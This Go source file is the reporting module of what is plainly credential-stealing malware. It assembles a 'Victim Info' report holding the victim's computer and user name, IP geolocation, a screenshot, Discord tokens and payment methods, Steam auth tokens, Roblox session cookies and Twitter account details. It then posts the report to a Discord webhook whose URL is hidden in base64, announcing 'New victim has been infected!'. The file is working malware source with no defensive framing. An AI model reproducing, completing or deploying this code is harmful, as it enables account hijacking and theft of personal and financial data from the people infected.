package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"mime/multipart"
	"net/http"
	"os"
	"strings"
)

var discordWebhookUrl string

type DiscordMessage struct {
	Content string         `json:"content"`
	Embeds  []DiscordEmbed `json:"embeds,omitempty"`
}

type DiscordEmbed struct {
	Title       string                 `json:"title,omitempty"`
	Description string                 `json:"description,omitempty"`
	Fields      []DiscordEmbedField    `json:"fields,omitempty"`
	Footer      *DiscordEmbedFooter    `json:"footer,omitempty"`
	Thumbnail   *DiscordEmbedThumbnail `json:"thumbnail,omitempty"`
	URL         string                 `json:"url,omitempty"`
	Image       *DiscordEmbedThumbnail `json:"image,omitempty"`
}

type DiscordEmbedField struct {
	Name   string `json:"name"`
	Value  string `json:"value"`
	Inline bool   `json:"inline,omitempty"`
}

type DiscordEmbedFooter struct {
	Text    string `json:"text"`
	IconURL string `json:"icon_url,omitempty"`
}

type DiscordEmbedThumbnail struct {
	URL string `json:"url"`
}

func SendDiscordNotification() error {
	computerInfo := []string{
		fmt.Sprintf("🖥️ **Computer Name:** `%s`", os.Getenv("COMPUTERNAME")),
		fmt.Sprintf("👤 **User Name:** `%s`", os.Getenv("USERNAME")),
		fmt.Sprintf("💾 **RAM:** %.0f GB", GetRAMTotal()),
		fmt.Sprintf("🧠 **CPU:** %s", GetCpuName()),
		fmt.Sprintf("🪟 **OS:** %s", GetFullOSName()),
	}
	ipInfo, err := GetIPInfo()
	if err != nil {
		panic(err)
	}

	embeds := []DiscordEmbed{
		{
			Title: "Victim Info",
			Fields: []DiscordEmbedField{
				{
					Name:   "💻 Computer Info",
					Value:  strings.Join(computerInfo, "\n"),
					Inline: true,
				},
				{
					Name: "📍 IP Info",
					Value: fmt.Sprintf(
						"**🌐 IP:** `%s`\n📍 **Location:** %s, %s, %s :flag_%s:\n**📡 ISP:** `%s`",
						ipInfo.IP, ipInfo.City, ipInfo.Region, ipInfo.Country, strings.ToLower(ipInfo.Country), ipInfo.Org,
					),
					Inline: true,
				},
			},
		},
	}

	for _, account := range discordAccountResults {
		badges := "None"
		if len(account.Badges) > 0 {
			badges = strings.Join(account.Badges, ", ")
		}
		nitro := "None"
		if account.NitroType == 1 {
			nitro = "Nitro Classic"
		} else if account.NitroType == 2 {
			nitro = "Nitro"
		} else if account.NitroType == 3 {
			nitro = "Nitro Basic"
		}
		paymentMethods := "None"
		if account.HasPaymentMethods && len(account.PaymentMethods) > 0 {
			paymentMethods = strings.Join(account.PaymentMethods, ", ")
		}
		embeds = append(embeds, DiscordEmbed{
			Title: fmt.Sprintf("Discord Account: %s", account.Username),
			Fields: []DiscordEmbedField{
				{
					Name:   "🆔 User ID",
					Value:  fmt.Sprintf("`%s`", account.ID),
					Inline: true,
				},
				{
					Name:   "👤 Username",
					Value:  fmt.Sprintf("`%s`", account.Username),
					Inline: true,
				},
				{
					Name:   "🏷️ Badges",
					Value:  badges,
					Inline: true,
				},
				{
					Name:   "💳 Payment Methods",
					Value:  paymentMethods,
					Inline: true,
				},
				{
					Name:   "✨ Nitro",
					Value:  nitro,
					Inline: true,
				},
				{
					Name:   "🔐 MFA Enabled",
					Value:  humanizeBoolean(account.HasMFA),
					Inline: true,
				},
				{
					Name: "📱 Phone",
					Value: func() string {
						if account.Phone != nil {
							return fmt.Sprintf("`%s`", *account.Phone)
						}
						return "None"
					}(),
					Inline: true,
				},
				{
					Name:   "📧 Email",
					Value:  fmt.Sprintf("`%s`", account.Email),
					Inline: true,
				},
				{
					Name:   "🔒 Token",
					Value:  fmt.Sprintf("```\n%s\n```", account.Token),
					Inline: false,
				},
			},
			URL: fmt.Sprintf("https://discord.com/users/%s", account.ID),
			Thumbnail: &DiscordEmbedThumbnail{
				URL: account.AvatarURL,
			},
			Footer: &DiscordEmbedFooter{
				Text: fmt.Sprintf("Found in: %s", account.FoundIn),
			},
		})
	}
	for _, account := range steamAccountResults {
		embeds = append(embeds, DiscordEmbed{
			Title: fmt.Sprintf("Steam Account: %s", account.Username),
			Fields: []DiscordEmbedField{
				{
					Name:   "🆔 ID",
					Value:  fmt.Sprintf("`%s`", account.SteamID),
					Inline: true,
				},
				{
					Name:   "👤 Account Name",
					Value:  fmt.Sprintf("`%s`", account.AccountName),
					Inline: true,
				},
				{
					Name:   "🧑 Username",
					Value:  fmt.Sprintf("`%s`", account.Username),
					Inline: true,
				},
				{
					Name: fmt.Sprintf("👥 Friends (%d)", len(account.Friends)),
					Value: func() string {
						if len(account.Friends) > 0 {
							str := strings.Join(account.Friends, ", ")
							if len(str) > 1024 {
								return str[:1021] + "..."
							}
							return str
						}
						return "None"
					}(),
					Inline: false,
				},
				{
					Name: fmt.Sprintf("👪 Groups (%d)", len(account.Groups)),
					Value: func() string {
						if len(account.Groups) > 0 {
							str := strings.Join(account.Groups, ", ")
							if len(str) > 1024 {
								return str[:1021] + "..."
							}
							return str
						}
						return "None"
					}(),
					Inline: false,
				},
				{
					Name: "🔐 Auth Token",
					Value: func() string {
						if account.AuthToken != "" {
							return fmt.Sprintf("```\n%s\n```", account.AuthToken)
						}
						return "Not Found"
					}(),
					Inline: true,
				},
			},
			Thumbnail: &DiscordEmbedThumbnail{
				URL: account.AvatarURL,
			},
			URL: fmt.Sprintf("https://steamcommunity.com/profiles/%s", account.SteamID),
			Footer: &DiscordEmbedFooter{
				Text:    fmt.Sprintf("Found in: %s", account.FoundIn),
				IconURL: "https://store.steampowered.com/favicon.ico",
			},
		})
	}
	for _, account := range robloxResults {
		embeds = append(embeds, DiscordEmbed{
			Title:       "Roblox Account Cookie",
			Description: fmt.Sprintf("`.ROBLOSECURITY` cookie:\n```\n%s\n```", account.Cookie),
			Fields: []DiscordEmbedField{
				{
					Name:   "🆔 User ID",
					Value:  fmt.Sprintf("`%d`", account.UserID),
					Inline: true,
				},
				{
					Name:   "👤 Username",
					Value:  fmt.Sprintf("`%s`", account.Username),
					Inline: true,
				},
				{
					Name:   "📝 Display Name",
					Value:  fmt.Sprintf("`%s`", account.DisplayName),
					Inline: true,
				},
				{
					Name:   "📧 Email",
					Value:  fmt.Sprintf("`%s`", account.Email),
					Inline: true,
				},
				{
					Name:   "📱 Phone",
					Value:  fmt.Sprintf("`%s`", account.Phone),
					Inline: true,
				},
				{
					Name:   "📅 Created At",
					Value:  fmt.Sprintf("<t:%d:f>", account.CreatedAt.Unix()),
					Inline: true,
				},
			},
			Thumbnail: &DiscordEmbedThumbnail{
				URL: account.AvatarUrl,
			},
			URL: fmt.Sprintf("https://www.roblox.com/users/%d/profile", account.UserID),
			Footer: &DiscordEmbedFooter{
				Text:    fmt.Sprintf("Found in: %s", account.FoundIn),
				IconURL: "https://www.roblox.com/favicon.ico",
			},
		})
	}
	for _, account := range twitterResults {
		embeds = append(embeds, DiscordEmbed{
			Title: fmt.Sprintf("Twitter Account: %s", account.Username),
			Fields: []DiscordEmbedField{
				{
					Name:   "👤 Display Name",
					Value:  fmt.Sprintf("`%s`", account.DisplayName),
					Inline: true,
				},
				{
					Name:   "🏷️ Username",
					Value:  fmt.Sprintf("`@%s`", account.Username),
					Inline: true,
				},
				{
					Name:   "📧 Email",
					Value:  fmt.Sprintf("`%s`", account.Email),
					Inline: true,
				},
				{
					Name:   "📱 Phone",
					Value:  fmt.Sprintf("`%s`", account.Phone),
					Inline: true,
				},
				{
					Name:   "📅 Created At",
					Value:  fmt.Sprintf("<t:%d:f>", account.CreatedAt.Unix()),
					Inline: true,
				},
				{
					Name:   "👥 Followers",
					Value:  fmt.Sprintf("`%d`", account.FollowersCount),
					Inline: true,
				},
				{
					Name:   "👤 Following",
					Value:  fmt.Sprintf("`%d`", account.FollowingCount),
					Inline: true,
				},
				{
					Name:   "📝 Tweet Count",
					Value:  fmt.Sprintf("`%d`", account.TweetCount),
					Inline: true,
				},
			},
			Thumbnail: &DiscordEmbedThumbnail{
				URL: account.AvatarURL,
			},
			URL: fmt.Sprintf("https://x.com/%s", account.Username),
			Footer: &DiscordEmbedFooter{
				Text:    fmt.Sprintf("Found in: %s", account.FoundIn),
				IconURL: "https://abs.twimg.com/favicons/twitter.ico",
			},
		})
	}

	message := DiscordMessage{
		Content: "New victim has been infected!",
		Embeds:  embeds,
	}
	screenshot := TakeScreenshot()

	if len(screenshot) > 0 {
		message.Embeds[0].Image = &DiscordEmbedThumbnail{URL: "attachment://screenshot.png"}
	}

	attachment := Attachment{Filename: "screenshot.png", Data: []byte{}}
	if screenshot != nil {
		attachment = Attachment{
			Filename: "screenshot.png",
			Data:     screenshot,
		}
	}
	payload, contentType, err := buildPayload(message, []Attachment{attachment})
	if err != nil {
		return err
	}

	decoded, _ := base64.StdEncoding.DecodeString(discordWebhookUrl)
	res, err := http.Post(string(decoded), contentType, bytes.NewReader(payload))
	if err != nil {
		return err
	}
	defer res.Body.Close()
	if res.StatusCode != http.StatusNoContent {
		return fmt.Errorf("failed to send Discord notification, status code: %d", res.StatusCode)
	}
	return nil
}

type Attachment struct {
	Filename string
	Data     []byte
}

func buildPayload(message DiscordMessage, attachments []Attachment) ([]byte, string, error) {
	// Marshal the message to JSON
	jsonData, err := json.Marshal(message)
	if err != nil {
		return nil, "", err
	}

	// Create the payload in multipart/form-data format
	var body bytes.Buffer
	writer := multipart.NewWriter(&body)
	defer writer.Close()

	// Add the JSON part
	part, err := writer.CreateFormField("payload_json")
	if err != nil {
		return nil, "", err
	}
	_, err = part.Write(jsonData)
	if err != nil {
		return nil, "", err
	}

	// Add attachments if any
	for i, attachment := range attachments {
		part, err := writer.CreateFormFile(fmt.Sprintf("files[%d]", i), attachment.Filename)
		if err != nil {
			return nil, "", err
		}
		_, err = part.Write(attachment.Data)
		if err != nil {
			return nil, "", err
		}
	}

	// Close the writer to finalize the form data
	err = writer.Close()
	if err != nil {
		return nil, "", err
	}

	return body.Bytes(), writer.FormDataContentType(), nil
}
